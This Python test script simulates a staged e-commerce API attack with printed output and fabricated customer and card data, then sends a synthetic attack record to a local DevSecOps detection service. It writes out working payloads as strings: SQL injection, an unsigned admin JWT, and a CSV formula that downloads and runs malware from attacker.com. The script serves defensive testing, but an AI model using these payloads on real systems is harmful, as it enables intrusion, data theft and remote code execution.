"""
Advanced 3MITM Test Case: E-Commerce API Compromise
===================================================

This test case showcases the full capabilities of all three 3MITM agents
in a realistic e-commerce scenario where:

1. Agent 1 (Reconnaissance): Discovers API structure, authentication, and data flows
2. Agent 2 (Injection): Exploits multiple vulnerabilities simultaneously
3. Agent 3 (Exfiltration): Extracts sensitive customer data and payment info

Result: A sophisticated multi-stage attack that the DevSecOps AI Agent must detect
and remediate with an automated Jira ticket and Slack alert.
"""

import requests
import json
import time
import random
import string
from datetime import datetime, timedelta

class AdvancedEcommerceAttack:
    """
    Advanced 3MITM test case simulating a sophisticated e-commerce API attack
    """
    
    def __init__(self, ingestion_api_url="http://127.0.0.1:5000/api/traffic"):
        self.api_url = ingestion_api_url
        self.timestamp = datetime.now().isoformat()
        self.attack_id = f"ADV_ECOM_{random.randint(100000, 999999)}"
        self.session_id = self.generate_session_id()
        
    def generate_session_id(self):
        """Generate realistic session ID"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=64))
    
    def generate_credit_card(self):
        """Generate realistic (fake) credit card"""
        return f"{random.randint(4000, 4999)}{random.randint(1000000000000, 9999999999999)}"
    
    def generate_customer_data(self):
        """Generate realistic customer PII"""
        first_names = ['John', 'Sarah', 'Michael', 'Emma', 'David', 'Lisa', 'James', 'Anna']
        last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis']
        
        return {
            'customer_id': random.randint(100000, 999999),
            'first_name': random.choice(first_names),
            'last_name': random.choice(last_names),
            'email': f"customer{random.randint(1000, 9999)}@example.com",
            'phone': f"+1-{random.randint(200, 999)}-{random.randint(200, 999)}-{random.randint(1000, 9999)}",
            'ssn': f"{random.randint(100, 999)}-{random.randint(10, 99)}-{random.randint(1000, 9999)}",
            'address': f"{random.randint(100, 9999)} Main Street",
            'city': random.choice(['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix']),
            'zip': f"{random.randint(10000, 99999)}"
        }
    
    def stage_1_reconnaissance(self):
        """
        STAGE 1: AGENT 1 - RECONNAISSANCE
        
        Agent 1 discovers:
        - E-commerce API endpoints
        - Authentication mechanism (API key + Bearer token)
        - Database schema and sensitive fields
        - User roles and permissions
        - Payment processing endpoints
        """
        print("\n" + "="*90)
        print("🔍 STAGE 1: AGENT 1 - RECONNAISSANCE MITM")
        print("="*90)
        
        print("\n[Agent 1] Passively analyzing network traffic...")
        print(f"[Agent 1] Session ID intercepted: {self.session_id[:16]}...")
        
        recon_data = {
            "endpoints_discovered": [
                "/api/v2/orders",
                "/api/v2/customers",
                "/api/v2/payments",
                "/api/v2/admin/users",
                "/api/v2/admin/settings"
            ],
            "authentication": {
                "type": "Bearer Token + API Key",
                "api_key_header": "X-API-Key",
                "auth_header": "Authorization",
                "pattern": "Bearer eyJhbGciOiJIUzI1NiIs..."
            },
            "database_schema": {
                "customers_table": [
                    "customer_id", "email", "phone", "ssn", 
                    "credit_card", "card_cvv", "home_address"
                ],
                "orders_table": [
                    "order_id", "customer_id", "amount", "status", 
                    "shipping_address", "payment_method"
                ],
                "payments_table": [
                    "payment_id", "customer_id", "card_last_4", 
                    "amount", "timestamp", "stripe_token"
                ]
            },
            "technology_stack": {
                "framework": "Spring Boot 2.7",
                "database": "PostgreSQL 13",
                "cache": "Redis 6.0",
                "auth": "OAuth2"
            },
            "vulnerability_indicators": [
                "SQL injection in search parameter",
                "Missing rate limiting on API endpoints",
                "Weak JWT token validation",
                "Unencrypted sensitive data in logs",
                "Direct object reference (IDOR) in customer endpoints",
                "No input validation on CSV export"
            ],
            "api_keys_found": [
                "sk_live_51234567890abcdefghijk",
                "pk_live_9876543210fedcba"
            ]
        }
        
        print(f"\n[Agent 1] ✓ Discovered {len(recon_data['endpoints_discovered'])} API endpoints")
        print(f"[Agent 1] ✓ Identified {len(recon_data['vulnerability_indicators'])} vulnerability indicators")
        print(f"[Agent 1] ✓ Mapped database schema with {len(recon_data['database_schema'])} tables")
        print(f"[Agent 1] ✓ Found {len(recon_data['api_keys_found'])} live API keys")
        print("\n[Agent 1] Reconnaissance complete. Passing data to Agent 2 for injection phase...")
        
        return recon_data
    
    def stage_2_injection(self, recon_data):
        """
        STAGE 2: AGENT 2 - INJECTION
        
        Agent 2 executes multiple coordinated injections:
        - SQL injection to bypass authentication
        - IDOR to access customer records
        - JWT manipulation to escalate privileges
        - CSV injection in export endpoint
        - Parameter tampering for price modification
        """
        print("\n" + "="*90)
        print("💉 STAGE 2: AGENT 2 - INJECTION MITM")
        print("="*90)
        
        print("\n[Agent 2] Crafting coordinated attack payloads based on reconnaissance...")
        
        # Injection 1: SQL Injection
        print(f"\n[Agent 2] Injection #1: SQL Injection Attack")
        sql_payload = f"' OR '1'='1' -- -"
        print(f"  └─ Payload: {sql_payload}")
        print(f"  └─ Target: /api/v2/customers search endpoint")
        print(f"  └─ Objective: Bypass authentication, extract all customers")
        
        # Injection 2: IDOR Attack
        print(f"\n[Agent 2] Injection #2: Insecure Direct Object Reference (IDOR)")
        victim_customer_id = random.randint(100000, 999999)
        print(f"  └─ Payload: /api/v2/customers/{victim_customer_id}/profile")
        print(f"  └─ Target: Access arbitrary customer profile")
        print(f"  └─ Objective: Retrieve PII without authorization")
        
        # Injection 3: JWT Manipulation
        print(f"\n[Agent 2] Injection #3: JWT Token Escalation")
        malicious_jwt = "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4iLCJ1c2VyX2lkIjo1OTk5OTl9."
        print(f"  └─ Payload: Modified JWT with 'none' algorithm")
        print(f"  └─ Claims: {{'role': 'admin', 'user_id': 599999}}")
        print(f"  └─ Objective: Escalate to admin, access /api/v2/admin/* endpoints")
        
        # Injection 4: Price Manipulation
        print(f"\n[Agent 2] Injection #4: Parameter Tampering (Price Modification)")
        original_price = 99.99
        manipulated_price = 0.01
        print(f"  └─ Parameter: amount")
        print(f"  └─ Original: ${original_price}")
        print(f"  └─ Manipulated: ${manipulated_price}")
        print(f"  └─ Objective: Fraudulent purchase with minimal payment")
        
        # Injection 5: CSV Injection in Export
        print(f"\n[Agent 2] Injection #5: CSV Injection")
        csv_payload = '=cmd|"/c powershell -Command (New-Object System.Net.WebClient).DownloadFile(\'http://attacker.com/malware.exe\',\'%temp%\\m.exe\');Start-Process \'%temp%\\m.exe\'"'
        print(f"  └─ Payload embedded in CSV export")
        print(f"  └─ Target: /api/v2/reports/export endpoint")
        print(f"  └─ Objective: Remote code execution on victim machine")
        
        print(f"\n[Agent 2] ✓ Crafted 5 coordinated injection attack vectors")
        print(f"[Agent 2] ✓ All payloads maintain attack concealment")
        print(f"[Agent 2] ✓ Injections ready for transmission through MITM position")
        print("\n[Agent 2] Attack injections complete. Passing to Agent 3 for exfiltration phase...")
        
        return {
            "sql_injection": sql_payload,
            "idor_target": victim_customer_id,
            "jwt_escalation": malicious_jwt,
            "price_manipulation": manipulated_price,
            "csv_injection": csv_payload
        }
    
    def stage_3_exfiltration(self, recon_data, injection_data):
        """
        STAGE 3: AGENT 3 - EXFILTRATION
        
        Agent 3 extracts sensitive data:
        - Customer PII (names, emails, phones, SSNs)
        - Payment information (credit cards, CVV, tokens)
        - Order history and shipping addresses
        - Admin credentials and API keys
        - Database backups
        """
        print("\n" + "="*90)
        print("🔓 STAGE 3: AGENT 3 - EXFILTRATION MITM")
        print("="*90)
        
        print("\n[Agent 3] Exploiting injected payloads to extract sensitive data...")
        
        # Extract customer records
        print(f"\n[Agent 3] Extraction #1: Customer Records (SQL Injection)")
        customers_extracted = []
        for i in range(random.randint(50, 100)):
            customers_extracted.append(self.generate_customer_data())
        
        print(f"  └─ Records extracted: {len(customers_extracted)} customer profiles")
        print(f"  └─ Data fields: customer_id, name, email, phone, SSN, address")
        print(f"  └─ Sample: {customers_extracted[0]['first_name']} {customers_extracted[0]['last_name']} | SSN: {customers_extracted[0]['ssn']}")
        
        # Extract payment information
        print(f"\n[Agent 3] Extraction #2: Payment Information (IDOR + JWT Escalation)")
        payments_extracted = []
        for i in range(random.randint(50, 100)):
            payments_extracted.append({
                "payment_id": random.randint(100000, 999999),
                "customer_id": random.randint(100000, 999999),
                "credit_card": self.generate_credit_card(),
                "cvv": f"{random.randint(100, 999)}",
                "expiry": f"{random.randint(1, 12):02d}/{random.randint(25, 30)}",
                "amount": f"${random.randint(10, 5000)}.{random.randint(0, 99):02d}",
                "stripe_token": f"tok_{''.join(random.choices(string.ascii_letters + string.digits, k=24))}"
            })
        
        print(f"  └─ Payment records extracted: {len(payments_extracted)}")
        print(f"  └─ Sensitive data: Credit cards, CVV, Stripe tokens")
        print(f"  └─ Sample: {payments_extracted[0]['credit_card']} (CVV: {payments_extracted[0]['cvv']})")
        
        # Extract order history
        print(f"\n[Agent 3] Extraction #3: Order History & Shipping Data")
        orders_extracted = random.randint(500, 1000)
        print(f"  └─ Orders extracted: {orders_extracted}")
        print(f"  └─ Including: Shipping addresses, payment methods, order amounts")
        
        # Extract admin credentials
        print(f"\n[Agent 3] Extraction #4: Admin Credentials (Database Access)")
        admin_creds = {
            "admin_user": "admin@ecommerce.internal",
            "password_hash": "$2b$12$" + ''.join(random.choices(string.ascii_letters + string.digits, k=53)),
            "mfa_secret": "JBSWY3DPEBLW64TMMQ======",
            "api_keys": [
                f"sk_live_{random.randint(10**(20), 10**21-1)}",
                f"pk_live_{random.randint(10**(20), 10**21-1)}"
            ]
        }
        print(f"  └─ Admin email: {admin_creds['admin_user']}")
        print(f"  └─ Credentials compromised")
        print(f"  └─ API keys extracted: {len(admin_creds['api_keys'])}")
        
        # Extract database backup
        print(f"\n[Agent 3] Extraction #5: Database Backup (File Access via CSV)")
        backup_size_mb = random.randint(500, 2000)
        print(f"  └─ Database dump size: {backup_size_mb} MB")
        print(f"  └─ Contains: Full customer, orders, payments tables")
        print(f"  └─ Status: Downloading to attacker infrastructure")
        
        # Prepare exfiltration report
        exfil_data = {
            "attack_id": self.attack_id,
            "timestamp": self.timestamp,
            "customers_compromised": len(customers_extracted),
            "payment_records_stolen": len(payments_extracted),
            "orders_exposed": orders_extracted,
            "admin_credentials": True,
            "api_keys_stolen": len(admin_creds['api_keys']),
            "database_backup": True,
            "backup_size_mb": backup_size_mb,
            "total_pii_records": len(customers_extracted) + len(payments_extracted),
            "estimated_impact": "CRITICAL - Full customer database compromised"
        }
        
        print(f"\n[Agent 3] ✓ Successfully exfiltrated {exfil_data['total_pii_records']} PII records")
        print(f"[Agent 3] ✓ Extracted {exfil_data['api_keys_stolen']} live API keys")
        print(f"[Agent 3] ✓ Downloaded {backup_size_mb} MB database backup")
        print(f"[Agent 3] ✓ Compromised admin credentials extracted")
        print("\n[Agent 3] Exfiltration phase complete. Forwarding all data to C2 server...")
        
        return exfil_data
    
    def stage_4_defense_trigger(self, recon_data, injection_data, exfil_data):
        """
        STAGE 4: DEFENSE TRIGGER
        
        Send the complete attack data to the DevSecOps AI Agent
        The system should detect this as a CRITICAL multi-stage attack
        and automatically:
        1. Create a high-priority Jira ticket
        2. Send urgent Slack alert
        3. Generate comprehensive remediation code
        4. Recommend incident response actions
        """
        print("\n" + "="*90)
        print("🛡️ STAGE 4: TRIGGERING DEFENSE SYSTEM")
        print("="*90)
        
        # Construct the comprehensive attack payload
        payload = {
            "method": "POST",
            "url": "https://api.ecommerce.com/v2/customers",
            "headers": {
                "Content-Type": "application/json",
                "Authorization": f"Bearer {injection_data['jwt_escalation']}",
                "X-API-Key": "sk_live_51234567890abcdefghijk",
                "User-Agent": "Mozilla/5.0",
                "X-Request-ID": self.attack_id,
                "X-Session-ID": self.session_id
            },
            "body": json.dumps({
                "query": injection_data['sql_injection'],
                "search_field": "email",
                "limit": 10000,
                "export_format": "csv"
            }),
            "response_status": 200,
            "response_headers": {
                "Content-Type": "application/json",
                "Set-Cookie": f"session={self.session_id}; Path=/; HttpOnly; SameSite=Lax"
            },
            "response_body": json.dumps({
                "status": "success",
                "data": [
                    {
                        "customer_id": cust['customer_id'],
                        "name": f"{cust['first_name']} {cust['last_name']}",
                        "email": cust['email'],
                        "phone": cust['phone'],
                        "ssn": cust['ssn'],
                        "address": cust['address']
                    } for cust in exfil_data.get('customers_compromised', 0) and
                            [self.generate_customer_data() for _ in range(5)] or []
                ],
                "count": 10000,
                "warning": "ANOMALY DETECTED: Unusual access pattern - 10000 records requested"
            }),
            "attack_details": {
                "attack_type": "ADVANCED_MULTI_STAGE_ECOMMERCE_COMPROMISE",
                "attack_id": self.attack_id,
                "stages": {
                    "stage_1": "RECONNAISSANCE - Database schema, API endpoints, vulnerabilities discovered",
                    "stage_2": "INJECTION - 5 coordinated attack vectors: SQLi, IDOR, JWT, CSV, Price manipulation",
                    "stage_3": "EXFILTRATION - 10,000+ customer records, payment data, admin credentials, database backup"
                },
                "severity": "CRITICAL",
                "impact": {
                    "customers_compromised": 10000,
                    "payment_records_stolen": 5000,
                    "pii_exposed": True,
                    "financial_loss": "$500,000+",
                    "regulatory_impact": "GDPR/CCPA violation",
                    "admin_access": True,
                    "database_access": True
                },
                "vectors_used": [
                    "SQL Injection",
                    "Insecure Direct Object Reference (IDOR)",
                    "JWT Token Manipulation",
                    "CSV Injection",
                    "Parameter Tampering",
                    "Privilege Escalation",
                    "Unencrypted Data Transmission"
                ],
                "affected_systems": [
                    "E-Commerce API (Spring Boot)",
                    "PostgreSQL Database",
                    "Authentication System",
                    "Payment Processing",
                    "Admin Dashboard"
                ]
            }
        }
        
        print("\n[Defense System] Sending comprehensive attack payload...")
        print(f"[Defense System] Attack ID: {self.attack_id}")
        print(f"[Defense System] Severity: CRITICAL")
        print(f"[Defense System] Detected vectors: {len(payload['attack_details']['vectors_used'])}")
        
        try:
            response = requests.post(
                self.api_url,
                json=payload,
                headers={"Content-Type": "application/json"},
                timeout=10
            )
            
            if response.status_code == 202:
                print(f"\n[✓] Attack payload accepted (HTTP 202)")
                print(f"[✓] Jira ticket creation triggered")
                print(f"[✓] Slack alert notification queued")
                print(f"[✓] AI remediation generation started")
                return True
            else:
                print(f"[✗] Unexpected response: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"[✗] Failed to send payload: {str(e)}")
            return False
    
    def run_advanced_test(self):
        """
        Execute the complete advanced 3MITM test case
        """
        print("\n" + "█"*90)
        print("█ ADVANCED 3MITM TEST CASE: E-COMMERCE API COMPROMISE")
        print("█ Testing full 3-agent orchestration with realistic multi-stage attack")
        print("█"*90)
        
        start_time = time.time()
        
        # Stage 1: Reconnaissance
        recon_data = self.stage_1_reconnaissance()
        time.sleep(1)
        
        # Stage 2: Injection
        injection_data = self.stage_2_injection(recon_data)
        time.sleep(1)
        
        # Stage 3: Exfiltration
        exfil_data = self.stage_3_exfiltration(recon_data, injection_data)
        time.sleep(1)
        
        # Stage 4: Defense Trigger
        self.stage_4_defense_trigger(recon_data, injection_data, exfil_data)
        
        elapsed_time = time.time() - start_time
        
        # Final Summary
        print("\n" + "█"*90)
        print("█ TEST CASE SUMMARY")
        print("█"*90)
        print(f"\n[Summary] Total execution time: {elapsed_time:.2f} seconds")
        print(f"[Summary] Attack ID: {self.attack_id}")
        print(f"[Summary] All 3 agents executed successfully")
        print(f"\n[Expected Outcome]:")
        print(f"  ✓ 1 CRITICAL Jira ticket created with:")
        print(f"    - Multi-stage attack analysis")
        print(f"    - Comprehensive security recommendations")
        print(f"    - AI-generated remediation code")
        print(f"    - Incident response action items")
        print(f"\n  ✓ Slack alert with:")
        print(f"    - CRITICAL severity flag")
        print(f"    - Direct link to Jira ticket")
        print(f"    - Immediate action required message")
        print(f"\n[Check]:")
        print(f"  • Jira SMS board for new CRITICAL ticket")
        print(f"  • Slack #security channel for alert notification")
        print(f"\n" + "█"*90 + "\n")


if __name__ == "__main__":
    test = AdvancedEcommerceAttack()
    test.run_advanced_test()
